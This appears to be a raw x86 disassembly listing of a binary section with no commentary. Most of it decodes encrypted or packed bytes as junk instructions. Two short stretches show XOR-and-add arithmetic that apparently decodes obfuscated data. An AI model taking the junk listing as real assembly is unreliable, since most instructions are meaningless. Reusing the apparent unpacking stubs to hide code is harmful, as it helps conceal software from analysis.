  407a57:	pop    esp
  407a58:	stos   DWORD PTR es:[edi],eax
  407a59:	mov    ecx,0x6250a5ca
  407a5e:	xor    BYTE PTR [ebp+0x20],bl
  407a61:	(bad)  
  407a62:	ins    BYTE PTR es:[edi],dx
  407a63:	aad    0x1
  407a65:	ins    BYTE PTR es:[edi],dx
  407a66:	xchg   cl,ah
  407a68:	mov    ebx,0x7489be1d
  407a6d:	dec    esp
  407a6e:	mov    edi,0x61ae9360
  407a73:	mov    edi,esp
  407a75:	stos   BYTE PTR es:[edi],al
  407a76:	pop    ecx
  407a77:	in     eax,dx
  407a78:	xchg   edx,eax
  407a79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a7a:	jae    0x407a2a
  407a7c:	mov    cl,0x22
  407a7e:	(bad)  
  407a7f:	cmp    BYTE PTR [edi],bh
  407a81:	repz inc esp
  407a83:	bound  edi,QWORD PTR [ebx]
  407a85:	aaa    
  407a86:	mov    ds:0xbac0f03,al
  407a8b:	push   ebx
  407a8c:	sbb    cl,bh
  407a8e:	mov    cl,0xe6
  407a90:	xor    edx,0x6ec35042
  407a96:	stos   DWORD PTR es:[edi],eax
  407a97:	mov    al,0xe4
  407a99:	(bad)  
  407a9a:	sbb    ecx,DWORD PTR [ebx+ebx*2-0x20]
  407a9e:	jbe    0x407a61
  407aa0:	imul   ebx,DWORD PTR [ecx],0x67
  407aa3:	enter  0x5a58,0x1a
  407aa7:	and    edi,edi
  407aa9:	mov    esi,0xc8ab2af7
  407aae:	mov    ds:0x86258932,al
  407ab3:	call   0x9b03:0xa05c46a
  407aba:	sub    ebx,DWORD PTR [ecx-0x90ada46]
  407ac0:	mov    al,0x7c
  407ac2:	dec    ebp
  407ac3:	add    DWORD PTR [edx+esi*8],ecx
  407ac6:	jle    0x407b36
  407ac8:	fucomi st,st(3)
  407aca:	fdivr  QWORD PTR [edi]
  407acc:	in     eax,dx
  407acd:	data16 in al,0xd1
  407ad0:	int3   
  407ad1:	and    edi,DWORD PTR [eax+0x2cf225cb]
  407ad7:	jbe    0x407b42
  407ad9:	mov    edi,0x1717ad29
  407ade:	mov    ebx,ds
  407ae0:	imul   ebx,DWORD PTR ds:0x8a4cf26f,0xffffff86
  407ae7:	pusha  
  407ae8:	jne    0x407b18
  407aea:	out    dx,al
  407aeb:	scas   eax,DWORD PTR es:[edi]
  407aec:	(bad)  
  407aed:	in     eax,dx
  407aee:	jo     0x407ab3
  407af0:	jmp    0x407a9c
  407af2:	jge    0x407aec
  407af4:	and    al,0x2d
  407af6:	jecxz  0x407a94
  407af8:	stos   BYTE PTR es:[edi],al
  407af9:	rcr    DWORD PTR [edi],cl
  407afb:	mov    eax,DWORD PTR [ebp-0x10]
  407afe:	xor    DWORD PTR [eax],0x2650fa8c
  407b04:	jmp    0x4072df
  407b09:	mov    ax,WORD PTR [ebp-0x4]
  407b0d:	mov    edi,DWORD PTR [ebp+0x8]
  407b10:	mov    edi,DWORD PTR [edi]
  407b12:	mov    edx,0x8a38
  407b17:	xor    ax,dx
  407b1a:	mov    edx,0x3afe
  407b1f:	add    ax,dx
  407b22:	jmp    0x407f10
  407b27:	int    0x82
  407b29:	adc    al,0x54
  407b2b:	push   ebp
  407b2c:	pop    esp
  407b2d:	dec    ebp
  407b2e:	xchg   ebx,eax
  407b2f:	leave  
  407b30:	mul    BYTE PTR [ebx-0x4e]
  407b33:	xchg   BYTE PTR [esi-0x29a6020e],ch
  407b39:	jle    0x407bb9
  407b3b:	dec    edi
  407b3c:	jns    0x407bbc
  407b3e:	jle    0x407acc
  407b40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b41:	add    al,0xe3
  407b43:	mov    dh,0x46
  407b45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407b46:	adc    DWORD PTR [ecx+0x58],edi
  407b49:	fisttp DWORD PTR [esi+0x60]
  407b4c:	jmp    0x68076927
  407b51:	cdq    
  407b52:	mov    edi,DWORD PTR [ebp+0x11777f53]
  407b58:	iret   
  407b59:	fsubrp st(1),st
  407b5b:	popf   
  407b5c:	jle    0x407b1c
  407b5e:	pop    esp
  407b5f:	out    0xe3,al
  407b61:	sub    al,0x62
  407b63:	lds    ebx,FWORD PTR [eax+0x12]
  407b66:	daa    
  407b67:	rcr    BYTE PTR [edi],cl
  407b69:	lods   al,BYTE PTR ds:[esi]
  407b6a:	sub    al,0xcb
  407b6c:	mov    esp,0xe684bdc3
  407b71:	mov    gs,WORD PTR [eax+0x59]
  407b74:	test   al,0xd9
  407b76:	jg     0x7cf64a65
  407b7c:	fmulp  st(2),st
  407b7e:	inc    ecx
  407b7f:	mov    ds,WORD PTR ds:0x17462f78
  407b85:	(bad)  
  407b87:	jmp    0x8d1208a4
  407b8c:	cs int3 
  407b8e:	sub    al,0x19
  407b90:	mov    edx,0x713b04ca
  407b95:	sub    esi,DWORD PTR [ebp+0x2f]
  407b98:	sub    al,BYTE PTR [ecx+ecx*4]
  407b9b:	push   ebp
  407b9c:	dec    ebp
  407b9d:	ins    DWORD PTR es:[edi],dx
  407b9e:	xchg   ebp,eax
  407b9f:	(bad)  
  407ba0:	icebp  
  407ba1:	test   al,0xb1
  407ba3:	cmp    cl,0x20
  407ba6:	mov    gs,WORD PTR [eax-0x2ffa8369]
  407bac:	jbe    0x407c2c
  407bae:	outs   dx,BYTE PTR ds:[esi]
  407baf:	mov    esp,0xcf1f0bec
  407bb4:	xlat   BYTE PTR ds:[ebx]
  407bb5:	fwait
  407bb6:	mov    dh,0x8c
  407bb8:	(bad)  
  407bb9:	pushf  
  407bba:	daa    
  407bbb:	add    BYTE PTR ds:0x14317858,al
  407bc1:	xor    BYTE PTR [ebx+0x4d],ch
  407bc4:	inc    esi
  407bc5:	ss and al,0x5e
  407bc8:	pop    edx
  407bc9:	loop   0x407b61
  407bcb:	sbb    BYTE PTR ds:0x7ed8c310,bl
  407bd1:	xor    al,0x5c
  407bd3:	sub    al,0xdf
  407bd5:	aad    0xee
  407bd7:	in     al,0x67
  407bd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407bda:	adc    BYTE PTR [eax-0x6ab74e24],0x1d
  407be1:	push   cs
  407be2:	outs   dx,BYTE PTR ds:[esi]
  407be3:	inc    esi
  407be4:	(bad)  
  407be5:	xchg   edx,eax
  407be6:	mov    ah,0x1b
  407be8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407be9:	scas   al,BYTE PTR es:[edi]
  407bea:	stos   BYTE PTR es:[edi],al
  407beb:	mov    eax,ds:0xd3aca37d
  407bf0:	adc    bl,dh
  407bf2:	popf   
  407bf3:	pop    es
  407bf4:	outs   dx,DWORD PTR ds:[esi]
  407bf5:	add    eax,0xf47881a4
  407bfa:	retf   
  407bfb:	ret    0x6c47
  407bfe:	retf   
  407bff:	mov    bl,0xf4
  407c01:	mov    ecx,0xe6fd9014
  407c06:	in     al,0x70
  407c08:	mov    bl,0x23
  407c0a:	rcl    DWORD PTR [edi-0x9],1
  407c0d:	mov    ecx,DWORD PTR [eax+eiz*1+0x1e]
  407c11:	dec    eax
  407c12:	cmp    cl,BYTE PTR [edi*1-0x55b9c28d]
  407c19:	int    0xc3
  407c1b:	mov    bh,0x2
  407c1d:	add    BYTE PTR [ebp-0xa],cl
  407c20:	push   edi
  407c21:	outs   dx,DWORD PTR ds:[esi]
  407c22:	push   ebx
  407c23:	cli    
  407c24:	dec    esp
  407c25:	rcl    BYTE PTR [esi-0xe],cl
  407c28:	out    0x47,al
  407c2a:	inc    esi
  407c2b:	sbb    esp,DWORD PTR [edx-0x52]
  407c2e:	vunpcklps xmm1,xmm3,XMMWORD PTR es:[ebp-0x6509fb84]
  407c37:	leave  
  407c38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c39:	lods   al,BYTE PTR ds:[esi]
  407c3a:	adc    eax,DWORD PTR ds:0x75d40a8b
  407c40:	dec    esp
  407c41:	cmp    dh,dl
  407c43:	and    ecx,DWORD PTR [edx]
  407c45:	test   al,0xc6
  407c47:	ja     0x407cc2
  407c49:	inc    ebx
  407c4a:	das    
  407c4b:	(bad)  
  407c4c:	imul   edi,ebp,0xf1f27591
  407c52:	and    edi,DWORD PTR [eax-0x62]
  407c55:	repz jmp 0x407c67
  407c58:	mov    bh,BYTE PTR [edi-0x1cc5a3cf]
  407c5e:	push   edi
  407c5f:	xlat   BYTE PTR ds:[ebx]
  407c60:	mov    cl,0x47
  407c62:	inc    esi
  407c63:	xchg   ecx,eax
  407c64:	xchg   edx,eax
  407c65:	rol    BYTE PTR [ebx-0x36],0x6c
  407c69:	sbb    al,0xdc
  407c6b:	lds    eax,FWORD PTR [edi]
  407c6d:	cdq    
  407c6e:	cdq    
  407c6f:	mov    ?,WORD PTR [ebx]
  407c71:	inc    esi
  407c72:	inc    ecx
  407c73:	retf   0x6c0f
  407c76:	mov    esi,0x20ff116
  407c7b:	add    esp,ebp
  407c7d:	scas   al,BYTE PTR es:[edi]
  407c7e:	nop
  407c7f:	dec    ebx
  407c80:	cwde   
  407c81:	(bad)  
  407c82:	pop    ecx
  407c83:	or     BYTE PTR [ebx],ah
  407c85:	nop
  407c86:	popa   
  407c87:	out    dx,eax
  407c88:	cmp    al,0x41
  407c8a:	into   
  407c8b:	mov    cl,0xaf
  407c8d:	jbe    0x407c2f
  407c8f:	rcr    DWORD PTR ds:0x8c951db5,1
  407c95:	cmc    
  407c96:	and    esi,edx
  407c98:	mov    cl,0x5
  407c9a:	push   esp
  407c9b:	je     0x407cee
  407c9d:	xchg   ebp,eax
  407c9e:	fdiv   DWORD PTR [ecx+0x63a46f93]
  407ca4:	dec    esp
  407ca5:	push   cs
  407ca6:	sbb    edi,DWORD PTR [eax-0x47]
  407ca9:	inc    eax
  407caa:	sub    DWORD PTR [ecx+0x32f540ab],edx
  407cb0:	inc    edi
  407cb1:	cmp    bl,BYTE PTR [esi-0x69b2c40b]
  407cb7:	jae    0x407d36
  407cb9:	lea    ebp,[esi]
  407cbb:	add    BYTE PTR [esi+0x1d9e182a],dl
  407cc1:	call   0xdefe:0x40032bea
  407cc8:	nop
  407cc9:	add    DWORD PTR [ebx],esi
  407ccb:	jge    0x407c84
  407ccd:	and    edx,esi
  407ccf:	int    0xdb
  407cd1:	gs inc ebp
  407cd3:	sub    DWORD PTR [ebp+eax*2-0x6],edi
  407cd7:	xchg   esi,eax
  407cd8:	lock or eax,0x11a83148
  407cde:	or     esp,ebx
  407ce0:	aas    
  407ce1:	in     eax,dx
  407ce2:	xor    al,BYTE PTR [edi+0x6a]
  407ce5:	mov    ecx,0x28521b8b
  407cea:	repnz fstp DWORD PTR [edx-0xd]
  407cee:	sub    eax,0x828adaf9
  407cf3:	jbe    0x407cea
  407cf5:	test   al,0x16
  407cf7:	jle    0x407d72
  407cf9:	ds fwait
  407cfb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407cfc:	sti    
  407cfd:	or     al,0x56
  407cff:	jno    0x407c91
  407d01:	icebp  
  407d02:	aad    0xd6
  407d04:	pop    ebp
  407d05:	enter  0x2584,0xa2
  407d09:	(bad)  
  407d0b:	jge    0x407ce9
  407d0d:	fs es daa 
  407d10:	jns    0x407d8d
  407d12:	in     al,0xf
  407d14:	aaa    
  407d15:	(bad)  
  407d16:	(bad)  
  407d17:	xchg   edi,eax
  407d18:	sub    BYTE PTR [edi],al
  407d1a:	bnd jmp 0xb61505e2
  407d20:	xlat   BYTE PTR ds:[ebx]
  407d21:	cs xchg ebx,eax
  407d23:	test   BYTE PTR [esi-0x20],ah
  407d26:	stos   DWORD PTR es:[edi],eax
  407d27:	jp     0x407cfc
  407d29:	out    0x6e,eax
  407d2b:	ins    DWORD PTR es:[edi],dx
  407d2c:	pop    esp
  407d2d:	pop    es
  407d2e:	aas    
  407d2f:	test   eax,0x5d93df9a
  407d34:	bswap  ebx
  407d36:	dec    ebx
  407d37:	lock and eax,0xb12bdee8
  407d3d:	aad    0xe4
  407d3f:	lahf   
  407d40:	xor    ebx,edx
  407d42:	ins    BYTE PTR es:[edi],dx
  407d43:	and    al,BYTE PTR [ecx-0x4c]
  407d46:	loop   0x407d0e
  407d48:	test   DWORD PTR [esi],ebp
  407d4a:	pop    ecx
  407d4b:	in     eax,dx
  407d4c:	test   al,0xfd
  407d4e:	and    DWORD PTR ds:0xe090f7c7,ecx
  407d54:	in     al,0xb6
  407d56:	repz lea esp,[edi-0x4b]
  407d5a:	test   al,0xef
  407d5c:	dec    esi
  407d5d:	or     BYTE PTR [ebx+0x48],0xcf
  407d61:	xchg   BYTE PTR [bp+di-0x21],bl
  407d65:	ret    0x4d48
  407d68:	call   0xf49c08c5
  407d6d:	mov    al,0x6c
  407d6f:	leave  
  407d70:	push   ecx
  407d71:	pop    ds
  407d72:	pop    eax
  407d73:	(bad)  
  407d74:	popf   
  407d75:	(bad)
  407d78:	pop    ebp
  407d79:	mov    WORD PTR [ecx-0x25df8fca],ss
  407d7f:	fisubr WORD PTR [edx+0x5f6fdbd0]
  407d85:	inc    ecx
  407d86:	or     BYTE PTR [edx],ch
  407d88:	ret    0x934b
  407d8b:	pop    ds
  407d8c:	(bad)  
  407d8e:	dec    edx
  407d8f:	rol    BYTE PTR [ebp-0x2b],0x33
  407d93:	lods   al,BYTE PTR ds:[esi]
  407d94:	test   DWORD PTR [ecx],esp
  407d96:	add    eax,0xb364162f
  407d9b:	iret   
  407d9c:	dec    ecx
  407d9d:	mov    ch,BYTE PTR [edx+0x6bbfb63]
  407da3:	cmp    BYTE PTR [edi],bl
  407da5:	fst    QWORD PTR [edi-0x63fceb84]
  407dab:	shl    BYTE PTR [eax+0x6b],0x5b
  407daf:	gs sbb ebx,edx
  407db2:	int    0x3e
  407db4:	hlt    
  407db5:	sar    DWORD PTR ds:[esi+0xe],1
  407db9:	mov    al,0xab
  407dbb:	mov    BYTE PTR [ecx],al
  407dbd:	add    DWORD PTR [edx+0x66],ecx
  407dc0:	jmp    0x93a4:0x3ce8121f
  407dc7:	dec    ebp
  407dc8:	adc    ecx,DWORD PTR [ecx]
  407dca:	pop    edi
  407dcb:	mov    al,ds:0x84dfaa19
  407dd0:	mov    al,ch
  407dd2:	and    DWORD PTR [ebx],eax
  407dd4:	out    0x40,al
  407dd6:	into   
  407dd7:	push   esp
  407dd8:	stos   BYTE PTR es:[edi],al
  407dd9:	and    al,0x2c
  407ddb:	in     eax,0x97
  407ddd:	mov    ds,edx
  407ddf:	(bad)  
  407de0:	mov    ecx,0xc9274943
  407de5:	lods   al,BYTE PTR ds:[esi]
  407de6:	or     al,ah
  407de8:	aam    0x2c
  407dea:	lods   al,BYTE PTR ds:[esi]
  407deb:	fdivr  DWORD PTR [esi+0x49]
  407dee:	cdq    
  407def:	xchg   BYTE PTR [edx-0x50],ah
  407df2:	scas   eax,DWORD PTR es:[edi]
  407df3:	stos   BYTE PTR es:[edi],al
  407df4:	cmc    
  407df5:	xchg   BYTE PTR [esi],ah
  407df7:	push   esi
  407df8:	mov    dl,0x68
  407dfa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407dfb:	or     eax,DWORD PTR [ecx]
  407dfd:	push   0xfbfd15d9
  407e02:	jl     0x407dbd
  407e04:	or     ebp,DWORD PTR [esi-0x241acb16]
  407e0a:	add    ecx,DWORD PTR [ebx+ebx*1+0x41]
  407e0e:	fcomp  DWORD PTR [ebx+0x5e7737d1]
  407e14:	adc    eax,0x27352833
  407e19:	aam    0xa7
  407e1b:	mov    esi,0xaca8a789
  407e20:	dec    esp
  407e21:	test   DWORD PTR [ebx],0x3f16ea0b
  407e27:	gs (bad) 
  407e29:	lock inc ebx
  407e2b:	jl     0x407ea7
  407e2d:	cli    
  407e2e:	das    
  407e2f:	lods   al,BYTE PTR ds:[esi]
  407e30:	mov    ch,0x3f
  407e32:	dec    edi
  407e33:	mov    esi,0x450e42b7
  407e38:	mov    esi,0x31cd33b6
  407e3d:	sbb    DWORD PTR [ebx],ebp
  407e3f:	sub    al,0xf0
  407e41:	rol    DWORD PTR [edi+0x1d],0x38
  407e45:	pop    ebp
  407e46:	cs mov cl,0x3b
  407e49:	mov    BYTE PTR [eax+ebp*4-0x33a57c33],dl
  407e50:	arpl   WORD PTR [eax],di
  407e52:	jg     0x407e71
  407e54:	jmp    0xa353:0x4777810d
  407e5b:	in     eax,0xc4
  407e5d:	loope  0x407eca
  407e5f:	mov    ah,0x57
  407e61:	icebp  
  407e62:	retf   0x59f1
  407e65:	popa   
  407e66:	inc    edi
  407e67:	dec    esp
  407e68:	loope  0x407e29
  407e6a:	mov    bh,0xbe
  407e6c:	pop    esp
  407e6d:	loop   0x407df4
  407e6f:	fdivr  QWORD PTR [ecx]
  407e71:	iret   
  407e72:	add    ecx,edi
  407e74:	das    
  407e75:	std    
  407e76:	stos   DWORD PTR es:[edi],eax
  407e77:	lea    ecx,[esi-0x3b50f794]
  407e7d:	xchg   esp,eax
  407e7e:	aad    0xf5
  407e80:	fcmovnb st,st(2)
  407e82:	in     eax,0x99
  407e84:	cmp    bh,BYTE PTR ds:0xe2808ca2
  407e8a:	push   ds
  407e8b:	outs   dx,BYTE PTR ds:[esi]
  407e8c:	loope  0x407e1a
  407e8e:	xor    al,0xbe
  407e90:	and    BYTE PTR [esi],bh
  407e92:	fs ja  0x407eea
  407e95:	and    eax,0x98da5880
  407e9a:	cmp    bl,BYTE PTR [eax+0x368d24fa]
  407ea0:	cmp    eax,0x58b6b9d8
  407ea5:	jnp    0x407e8c
  407ea7:	mov    cl,0xac
  407ea9:	div    edx
  407eab:	xchg   esi,eax
  407eac:	push   0x86df2f58
  407eb1:	xchg   BYTE PTR [edx],dh
  407eb3:	inc    ecx
  407eb4:	scas   al,BYTE PTR es:[edi]
  407eb5:	cld    
  407eb6:	dec    ecx
  407eb7:	mov    ds:0x97e8527d,eax
  407ebc:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ebe:	mov    edi,0x2be875c
  407ec3:	mov    eax,0x8d744216
  407ec8:	push   0x571ee3c5
  407ecd:	cmp    DWORD PTR [ebx+0x638cd54c],ebp
  407ed3:	mov    esp,0x10817735
  407ed8:	mov    esp,ecx
  407eda:	jbe    0x407f58
  407edc:	sti    
  407edd:	shl    BYTE PTR [edi-0xf],0x32
  407ee1:	dec    eax
  407ee2:	fldenv [edi+0x2]
  407ee5:	dec    esp
  407ee6:	mov    bl,0x1b
  407ee8:	pop    ebx
  407ee9:	inc    ecx
  407eea:	xchg   edi,eax
  407eeb:	pusha  
  407eec:	aam    0xa4
  407eee:	leave  
  407eef:	or     BYTE PTR [edx+0x4d089252],al
  407ef5:	inc    ecx
  407ef6:	xchg   ebp,eax
  407ef7:	mov    al,ds:0x63ccd954
  407efc:	clc    
  407efd:	adc    DWORD PTR [edi+edx*8],esp
  407f00:	mov    bl,0x9b
  407f02:	inc    esp
  407f03:	sahf   
  407f04:	adc    al,0xd1
  407f06:	adc    ch,bh
  407f08:	xchg   DWORD PTR [ebx+ebx*2+0x63],ebp
  407f0c:	add    esi,0xffffffbd
  407f0f:	adc    esp,DWORD PTR [esi+0x3b]
  407f12:	pop    es
  407f13:	je     0x407f60
  407f19:	mov    eax,DWORD PTR [ebp-0x14]
  407f1c:	xor    eax,ecx
  407f1e:	add    eax,esi
  407f20:	mov    DWORD PTR [ebp-0x24],eax
  407f23:	mov    eax,DWORD PTR [ebp-0x28]
  407f26:	mov    di,WORD PTR [ebp-0x2c]
  407f2a:	mov    ebx,0x8a38
  407f2f:	xor    di,bx
  407f32:	add    di,dx
  407f35:	movzx  edx,di
  407f38:	mov    edi,DWORD PTR [ebp-0x8]
  407f3b:	xor    edi,ecx
  407f3d:	lea    edx,[edx+edi*1+0x327299]
  407f44:	add    DWORD PTR [eax],edx
  407f46:	mov    eax,DWORD PTR [ebp-0x20]
  407f49:	mov    edx,DWORD PTR [ebp-0x8]
  407f4c:	mov    edi,DWORD PTR [ebp-0x24]
  407f4f:	xor    edx,ecx
  407f51:	add    edx,esi
  407f53:	imul   edx,edi
  407f56:	sub    DWORD PTR [eax],edx
  407f58:	mov    eax,DWORD PTR [ebp-0x14]
  407f5b:	jmp    0x4072e2
  407f60:	mov    eax,DWORD PTR [ebp-0xc]
  407f63:	mov    edx,DWORD PTR [ebp-0x18]
  407f66:	jmp    0x408354
  407f6b:	fadd   st,st(0)
  407f6d:	test   eax,0x6177b1f6
  407f72:	ror    BYTE PTR [ebx],1
  407f74:	ins    DWORD PTR es:[edi],dx
  407f75:	pop    eax
  407f76:	jl     0x407f0c
  407f78:	sub    al,0xf0
  407f7a:	imul   BYTE PTR [edx+0x4f7e7ed2]
  407f80:	jns    0x408000
  407f82:	jle    0x407fb1
  407f84:	or     esp,DWORD PTR [ebx+0x3ac60619]
  407f8a:	stos   BYTE PTR es:[edi],al
  407f8b:	or     eax,0xe0e3a121
  407f90:	fadd   DWORD PTR [edx-0x26]
  407f93:	data16 add al,0x61
  407f96:	sbb    BYTE PTR [eax-0x159da648],ah
  407f9c:	xchg   ebx,eax
  407f9d:	pop    edi
  407f9e:	mov    esp,0x250b54d2
  407fa3:	lea    esp,[edx-0x55]
  407fa6:	jo     0x407ffb
  407fa8:	xor    edi,DWORD PTR [ecx-0x67]
  407fab:	sbb    BYTE PTR [ebx+0x64b0c0d3],0xe5
  407fb2:	rcl    DWORD PTR [ecx+0x4e4156ea],1
  407fb8:	(bad)  
  407fb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407fba:	and    DWORD PTR [edi+0x1736edf1],ebp
  407fc0:	sub    ecx,ecx
  407fc2:	mov    edi,DWORD PTR [edx-0x1d]
  407fc5:	aas    
  407fc6:	dec    ebx
  407fc7:	shr    BYTE PTR [ebp+0x5c],1
  407fca:	mov    ebx,0xb1bf6f18
  407fcf:	xor    esi,DWORD PTR ds:[ecx]
  407fd2:	shl    BYTE PTR [ebp-0x4c],1
  407fd5:	in     eax,0xb6
  407fd7:	push   edx
  407fd8:	sbb    BYTE PTR [eax],ah
  407fda:	push   es
  407fdb:	mov    ah,0xc6
  407fdd:	dec    esp
  407fde:	outs   dx,DWORD PTR ds:[esi]
  407fdf:	sbb    DWORD PTR [ebp+0x56ff7204],ecx
  407fe5:	dec    eax
  407fe6:	sbb    eax,0xebe27a23
  407feb:	test   cl,dh
  407fed:	aaa    
  407fee:	data16 mov bl,0xf3
  407ff1:	mov    bh,0xf1
  407ff3:	lods   eax,DWORD PTR ds:[esi]
  407ff4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ff5:	fdivr  DWORD PTR [edi-0x23]
  407ff8:	call   0xad089ab0
  407ffd:	mov    ebp,eax
  407fff:	lods   al,BYTE PTR ds:[esi]
  408000:	dec    edi
  408001:	pop    ss
  408002:	add    BYTE PTR [ecx],bh
  408004:	mov    ds:0xcabebbbe,eax
  408009:	mov    dh,0xdc
  40800b:	xchg   esi,eax
  40800c:	lea    esi,[eax-0x7]
  40800f:	sub    al,0xee
  408011:	sahf   
  408012:	stc    
  408013:	pop    eax
  408014:	pop    edx
  408015:	inc    eax
  408016:	div    DWORD PTR [ecx]
  408018:	cmp    dl,BYTE PTR [edi+0xb]
  40801b:	lods   eax,DWORD PTR ds:[esi]
  40801c:	mov    dl,0xd1
  40801e:	call   0x81012041
  408023:	dec    edi
  408024:	mov    DWORD PTR [ebx-0x5b8d3e68],ecx
  40802a:	and    BYTE PTR [esi-0x16],dl
  40802d:	dec    edi
  40802e:	add    BYTE PTR [ebx-0x1d942d79],cl
  408034:	sub    DWORD PTR [edi-0x23],eax
  408037:	mov    edi,0x105e6a3a
  40803c:	sub    dl,BYTE PTR [esi-0x3deceef3]
  408042:	sbb    al,ah
  408044:	push   ecx
  408045:	rcr    DWORD PTR [edx],0xed
  408048:	rcl    DWORD PTR [ebx+0x7b76b6b5],cl
  40804e:	cmp    BYTE PTR [esi-0x51],ch
  408051:	mov    ds:0xc18c0466,al
  408056:	push   edx
  408057:	or     al,0x4e
  408059:	jp     0x4080d3
  40805b:	ds nop
  40805d:	int3   
  40805e:	or     cl,0xfb
  408061:	and    ebp,DWORD PTR [eax]
  408063:	pop    ecx
  408064:	jnp    0x407fee
  408066:	icebp  
  408067:	call   0x664b3772
  40806c:	retf   
  40806d:	aad    0xab
  40806f:	jg     0x40806c
  408071:	mov    ebx,0x7d45f474
  408076:	mov    eax,0x287e863f
  40807b:	mov    ah,0x52
  40807d:	inc    ebp
  40807e:	cmp    ch,0xde
  408081:	(bad)  
  408082:	std    
  408083:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408084:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408085:	jmp    0xc888c189
  40808a:	fwait
  40808b:	or     ebx,edx
  40808d:	dec    edi
  40808e:	sar    cl,cl
  408090:	mov    BYTE PTR cs:[ecx-0x48a2127],al
  408097:	pusha  
  408098:	test   eax,0xfacf0f4a
  40809d:	push   es
  40809e:	jbe    0x4080fe
  4080a0:	mov    BYTE PTR [eax+0x33],al
  4080a3:	loope  0x40811b
  4080a5:	call   0x894b90e8
  4080aa:	jp     0x4080f3
  4080ac:	icebp  
  4080ad:	loopne 0x4080ba
  4080af:	ins    BYTE PTR es:[edi],dx
  4080b0:	mov    dh,0xd7
  4080b2:	sahf   
  4080b3:	and    DWORD PTR [esi+0x10817b02],ecx
  4080b9:	loopne 0x4080bf
  4080bb:	lea    eax,[esi+eiz*1]
  4080be:	loopne 0x408076
  4080c0:	adc    ah,BYTE PTR [ebx-0x6e9d4e53]
  4080c6:	push   ebx
  4080c7:	loope  0x4080f8
  4080c9:	adc    bh,BYTE PTR [edx+eiz*8+0x77]
  4080cd:	(bad)  
  4080ce:	jmp    0xbdec:0x672c5e59
  4080d5:	test   DWORD PTR [edi],esp
  4080d7:	bound  eax,QWORD PTR [ecx+0x6129a753]
  4080dd:	outs   dx,BYTE PTR ds:[esi]
  4080de:	jecxz  0x408115
  4080e0:	push   edx
  4080e1:	int    0xbf
  4080e3:	jg     0x408088
  4080e5:	mov    bl,0xd8
  4080e7:	ret    0x163c
  4080ea:	xor    DWORD PTR [esi],ebx
  4080ec:	ret    
  4080ed:	stc    
  4080ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4080ef:	and    al,0xd4
  4080f1:	mov    cl,0x39
  4080f3:	mov    ds:0xbe5728b5,eax
  4080f8:	ja     0x40814d
  4080fa:	fadd   QWORD PTR [ecx+0x7a]
  4080fd:	mov    ah,0xd3
  4080ff:	mov    DWORD PTR [ebx],edx
  408101:	pusha  
  408102:	xchg   edi,eax
  408103:	cmp    dl,al
  408105:	dec    ecx
  408106:	xor    ebp,DWORD PTR [esi+0x11]
  408109:	mov    al,ds:0x3b7475fd
  40810e:	in     eax,dx
  40810f:	and    ecx,DWORD PTR [eax]
  408111:	add    DWORD PTR [ecx+0x2c15dc38],0x2878ae97
  40811b:	pushf  
  40811c:	(bad)  
  40811d:	jbe    0x4080ac
  40811f:	jnp    0x4080a6
  408121:	ret    
  408122:	cmp    eax,0x4f5d1faf
  408127:	jb     0x408138
  408129:	jnp    0x40815d
  40812b:	pushf  
  40812c:	les    ecx,FWORD PTR ds:0x262d354e
  408132:	inc    esi
  408133:	fcom   QWORD PTR [edi-0x54]
  408136:	jns    0x408128
  408138:	xor    dl,dh
  40813a:	push   eax
  40813b:	push   edi
  40813c:	jbe    0x4080f5
  40813e:	nop
  40813f:	pop    ds
  408140:	cmp    DWORD PTR [edx-0x4d],esi
  408143:	rcl    DWORD PTR [ebp+0x23],1
  408146:	push   ds
  408147:	sti    
  408148:	and    al,0xd6
  40814b:	hlt    
  40814c:	sar    BYTE PTR ds:0x69c0e726,cl
  408152:	adc    esi,DWORD PTR [ebp-0x3c]
  408155:	push   ecx
  408156:	(bad)  
  408158:	mov    edi,es
  40815a:	gs push ebx
  40815c:	cmp    BYTE PTR [ebx+0x1f4fa4df],0xf8
  408163:	add    DWORD PTR [edx-0x2be15e1d],0xc19c0dfd
  40816d:	xchg   edi,eax
  40816e:	inc    esi
  40816f:	mov    BYTE PTR [ebp+edi*2+0x5049ffa5],cl
  408176:	mov    eax,ds:0xfaf121c5
  40817b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40817c:	mov    esi,0x8bde6177
  408181:	jno    0x4081ec
  408183:	outs   dx,DWORD PTR ds:[esi]
  408184:	fstp   st(4)
  408186:	dec    edi
  408187:	jle    0x4081f2
  408189:	loop   0x40816a
  40818b:	stos   DWORD PTR es:[edi],eax
  40818c:	rcl    BYTE PTR [eax-0x41],0xaa
  408190:	dec    edi
  408191:	in     eax,dx
  408192:	sbb    ah,BYTE PTR [esi+0x36]
  408195:	(bad)  
  408196:	mov    eax,esi
  408198:	int    0x91
  40819a:	push   0x1b190d01
  40819f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4081a0:	jae    0x408134
  4081a2:	dec    eax
  4081a3:	mov    dl,0x58
  4081a5:	(bad)  
  4081a6:	fdiv   DWORD PTR ds:0x935c4ab3
  4081ac:	pop    ebp
  4081ad:	fild   WORD PTR [esi-0x25e037a8]
  4081b3:	mov    esi,0xeae5c0fc
  4081b8:	(bad)  
  4081b9:	mov    al,ds:0xfbd13f3c
  4081bf:	fs into 
  4081c1:	iret   
  4081c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4081c3:	dec    ecx
  4081c4:	inc    esi
  4081c5:	or     DWORD PTR [ecx],ebp
  4081c7:	arpl   sp,di
  4081c9:	and    eax,0xf448b987
  4081ce:	pop    ecx
  4081cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
